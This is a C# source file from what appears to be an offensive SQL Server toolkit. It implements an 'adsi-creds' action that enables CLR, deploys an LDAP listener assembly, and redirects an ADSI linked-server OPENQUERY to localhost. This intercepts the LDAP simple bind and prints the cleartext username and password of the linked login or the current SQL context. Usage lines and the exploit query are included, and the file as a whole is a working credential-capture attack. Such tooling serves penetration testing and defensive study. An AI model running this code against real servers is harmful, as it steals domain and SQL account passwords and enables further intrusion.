// MSSQLand/Actions/Domain/AdsiCredentialExtractor.cs

using System;
using System.Data;
using System.Threading.Tasks;

using MSSQLand.Services;
using MSSQLand.Utilities;

namespace MSSQLand.Actions.Domain
{
    /// <summary>
    /// Captures cleartext credentials via LDAP simple bind interception against an ADSI linked server.
    /// Requires CONTROL SERVER or sysadmin (CLR deployment). For unprivileged capture, use adsi-redirect.
    ///
    /// How it works:
    ///   Deploys a CLR assembly that starts a local LDAP listener, then redirects an ADSI OPENQUERY
    ///   to localhost. SQL Server performs an LDAP simple bind: sending credentials in cleartext.
    ///
    /// Scenario A: Existing ADSI server with explicit linked login (e.g. PGD\svc-ldap):
    ///   The bind uses the configured linked login, not your own credentials.
    ///   Captured password belongs to that domain account.
    ///   dotnet MSSQLand.exe SQL01 -c local -u analyst -p "..." adsi-creds
    ///
    /// Scenario B: Existing ADSI server with useself=TRUE (no linked login):
    ///   The bind uses the current SQL context's password.
    ///   Only interesting when you landed via a linked server as an unknown SQL login (e.g. sa).
    ///   dotnet MSSQLand.exe SQL01 -c local -u analyst -p "..." -l SQL02 adsi-creds
    ///
    /// Scenario C: No existing ADSI server, opt-in temporary server (--temp):
    ///   Creates a useself=TRUE server, captures the current SQL context's password, then drops it.
    ///   Same value as B but without a pre-existing ADSI server. Noisier (creates sys.servers entry).
    ///   dotnet MSSQLand.exe SQL01 -c local -u analyst -p "..." -l SQL02 adsi-creds --temp
    ///
    /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
    /// </summary>
    internal class AdsiCredentialExtractor : BaseAction
    {
        [ArgumentMetadata(Position = 0, Description = "Target ADSI server name (auto-discovers if omitted)")]
        private string _targetServer = "";

        [ArgumentMetadata(ShortName = "t", LongName = "temp", Description = "Create a temporary useself=TRUE ADSI server to capture the current SQL context's password. Requires CONTROL SERVER. Only useful when landing as an unknown SQL login via a linked server chain.")]
        private bool _useTemporaryServer = false;

        [ExcludeFromArguments]
        private bool _useExistingServer = false;

        public override void ValidateArguments(string[] args)
        {
            BindArguments(args);

            if (args != null && args.Length > 1)
            {
                throw new ArgumentException("Usage: adsi-creds [adsi-server] [--temp]");
            }

            _useExistingServer = !string.IsNullOrWhiteSpace(_targetServer);
        }


        /// <summary>
        /// Executes the ADSI credential extraction.
        /// </summary>
        public override object Execute(DatabaseContext databaseContext)
        {
            if (_useExistingServer)
            {
                return ExtractFromExistingServer(databaseContext);
            }

            // Discover existing ADSI servers on the execution target first.
            // An existing server may have an explicit linked login (capturing someone else's
            // credentials), so we must not reject based on auth type before checking.
            AdsiService discovery = new(databaseContext);
            var existingServers = discovery.GetAdsiServerNames();
            if (existingServers.Count > 0)
            {
                _targetServer = existingServers[0];
                Logger.Info($"Found existing ADSI linked server: '{_targetServer}'");
                _useExistingServer = true;
                return ExtractFromExistingServer(databaseContext);
            }

            if (!_useTemporaryServer)
            {
                Logger.Warning("No existing ADSI linked server found.");
                Logger.WarningNested("Use --temp to create a temporary server and capture the current SQL context's password");
                Logger.WarningNested("Use adsi-redirect <listener> if you lack CONTROL SERVER");
                return null;
            }

            // --temp path: no existing server, user explicitly opted in.
            // A temporary useself=TRUE server captures the current SQL context's password.
            // Only meaningful when landing as an unknown SQL login via a linked server chain.

            return ExtractWithTemporaryServer(databaseContext);
        }

        /// <summary>
        /// Extracts credentials from an existing ADSI linked server.
        /// </summary>
        private Tuple<string, string> ExtractFromExistingServer(DatabaseContext databaseContext)
        {
            Logger.InfoNested($"Extracting credentials from existing ADSI server '{_targetServer}'");
            return ExtractCredentials(databaseContext, _targetServer);
        }

        /// <summary>
        /// Creates a temporary ADSI server, extracts credentials, then cleans up.
        /// </summary>
        private Tuple<string, string> ExtractWithTemporaryServer(DatabaseContext databaseContext)
        {
            Logger.InfoNested("Creating temporary ADSI server for credential extraction");

            AdsiService adsiService = new(databaseContext);

            // Try to create the ADSI server
            if (!adsiService.CreateAdsiLinkedServer(out _targetServer, "localhost"))
            {
                Logger.Error("Failed to create temporary ADSI server.");
                return null;
            }

            Logger.InfoNested($"Server name: {_targetServer}");

            try
            {
                return ExtractCredentials(databaseContext, _targetServer);
            }
            finally
            {
                // Always clean up the temporary server
                Logger.InfoNested($"Cleaning up temporary ADSI server '{_targetServer}'");
                try
                {
                    adsiService.DropLinkedServer(_targetServer);
                }
                catch (Exception ex)
                {
                    Logger.Warning($"Failed to cleanup temporary server: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Extracts credentials using an ADSI provider by intercepting LDAP simple bind.
        /// </summary>
        private Tuple<string, string> ExtractCredentials(DatabaseContext databaseContext, string adsiServer)
        {
            AdsiService adsiService = new(databaseContext);

            // Verify the ADSI server exists
            if (!adsiService.AdsiServerExists(adsiServer))
            {
                Logger.Error($"ADSI linked server '{adsiServer}' not found.");
                Logger.InfoNested("List available ADSI servers with: adsi-manager list");
                return null;
            }

            Logger.InfoNested($"Extracting credentials via LDAP simple bind interception");

            Logger.InfoNested($"Targeting linked ADSI server: {adsiServer}");

            // CLR deployment requires CONTROL SERVER or sysadmin.
            // For unprivileged capture via an external listener, use adsi-redirect instead.
            if (!databaseContext.UserService.IsAdmin() && !databaseContext.UserService.HasPermission("CONTROL SERVER"))
            {
                Logger.Error("CLR deployment requires sysadmin or CONTROL SERVER.");
                Logger.ErrorNested("To capture credentials without privileges, use: adsi-redirect <listener> [adsi-server]");
                return null;
            }

            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
            {
                Logger.Error("Failed to enable CLR. Aborting execution.");
                return null;
            }

            adsiService.Port = NetworkHelper.GetRandomUnusedPort();

            try
            {
                adsiService.LoadLdapServerAssembly();
                Task<DataTable> task = adsiService.ListenForRequest();

                Logger.InfoNested("Executing LDAP solicitation");

                // For a temporary server using @useself='true', impersonated users won't have
                // a login mapping on the newly created server: bail out early.
                // Existing servers have their own configured login, so impersonation doesn't matter.
                if (!_useExistingServer)
                {
                    string[] impersonateTargets = databaseContext.QueryService.ExecutionServer.ImpersonationUsers;
                    if (impersonateTargets != null && impersonateTargets.Length > 0)
                    {
                        Logger.Warning("Cannot retrieve impersonated user credentials. Not mapped to temporary ADSI server");
                        Logger.WarningNested("The impersonated context uses the original user's authentication method");
                        return null;
                    }
                }

                string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ')";

                try
                {
                    databaseContext.QueryService.ExecuteNonProcessing(exploitQuery);
                }
                catch
                {
                    // Ignore the exception, it is normal to fail
                }

                // Wait for the background task to complete and get the result
                DataTable ldapResult = task.Result;

                if (ldapResult != null && ldapResult.Rows.Count > 0)
                {
                    string rawCredentials = ldapResult.Rows[0][0].ToString();

                    // Split only at the first occurrence of ':'
                    int splitIndex = rawCredentials.IndexOf(':');
                    if (splitIndex > 0)
                    {
                        string username = rawCredentials.Substring(0, splitIndex);
                        string password = rawCredentials.Substring(splitIndex + 1);

                        Logger.Success("Credentials retrieved via LDAP simple bind");
                        Console.WriteLine($"Username: {username}");
                        Console.WriteLine($"Password: {password}");

                        return Tuple.Create(username.Trim(), password.Trim());
                    }
                    else
                    {
                        Logger.Warning($"Unexpected credential format: {rawCredentials}");
                        return null;
                    }
                }

                // Provide helpful feedback based on context
                if (_useExistingServer)
                {
                    Logger.Warning("No credentials found - the ADSI server may not have a linked login configured.");
                    Logger.WarningNested($"Check linked logins: EXEC sp_helplinkedsrvlogin '{adsiServer}'");
                }
                else
                {
                    Logger.Warning("No credentials captured - connection may be using GSSAPI (Kerberos).");
                }

                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"ADSI credential extraction failed: {ex.Message}");
                return null;
            }
            finally
            {
                Logger.InfoNested("Cleaning up CLR assembly and function");
                try { databaseContext.ConfigService.DropDependentObjects(adsiService.AssemblyName); } catch { }
                try { databaseContext.QueryService.ExecuteNonProcessing($"DROP FUNCTION IF EXISTS [{adsiService.FunctionName}];"); } catch { }
                try { databaseContext.QueryService.ExecuteNonProcessing($"DROP ASSEMBLY IF EXISTS [{adsiService.AssemblyName}];"); } catch { }
            }
        }
    }
}
